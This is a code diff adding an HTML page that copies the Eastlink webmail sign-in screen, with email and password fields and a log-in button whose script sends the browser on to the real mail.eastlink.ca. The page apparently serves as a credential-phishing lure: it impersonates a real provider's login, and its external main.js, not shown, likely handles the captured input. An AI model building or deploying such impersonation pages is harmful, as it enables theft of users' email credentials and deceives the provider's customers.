@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/remixicon/4.6.0/remixicon.css"/>
+    <link rel="stylesheet" href="style.css">
+    <title>Sign in with Eastlink</title>
+</head>
+<body class="bg-white">
+
+    <form action="" class="max-w-md mx-auto" id="form">
+        <div class="px-6 mt-20 flex flex-col justify-center mx-auto md:mt-52 lg:mt-56">
+            <h3 class="font-normal text-center text-2xl max-w-sm mx-auto">Webmail - Please sign in using your full email address</h3>
+            <div class="mt-6 flex flex-col mx-auto justify-center">
+                <div class="flex items-center relative">  
+                    <i class="ri-user-3-line ml-2 absolute text-gray-400"></i>
+                    <input type="email" id="email" placeholder="Email address (user@eastlink.ca)" class="md:w-[350px] focus:ring-2 focus:ring-yellow-400 focus:outline-none w-[270px] h-10 placeholder:pl-10 border border-gray-400 p-1" required>
+                </div>
+
+                <div class="mt-2 flex items-center relative"> 
+                    <i class="absolute text-gray-400 ri-lock-line top-68 ml-2"></i>
+                    <input type="password" id="password" placeholder="Password" class="md:w-[350px] focus:outline-none w-[270px] h-10 placeholder:pl-10 border border-gray-400 p-1 focus:ring-2 focus:ring-yellow-400" required>
+                </div>
+            </div>
+            <p class="text-center text-sm pt-6 text-gray-900"><a href="">Don't remember your password?</a></p>
+        </div>
+        <script>
+            function redirect() {
+              window.location.href = "https://mail.eastlink.ca/"+[];
+            }
+          </script>
+        <button type="submit" onclick="redirect()" class=" lg:bottom-[200px] md:ml-12 sm md:bottom-[140px] align-middle fixed bottom-0 w-full rounded-md md:w-[350px] mt-4 inline-block bg-[#E81849] px-6 py-4 text-white">LOG IN<i class="ri-arrow-drop-right-line text-white"></i></button>
+    </form>
+    
+<script src="main.js"></script>
+</body>
+</html>
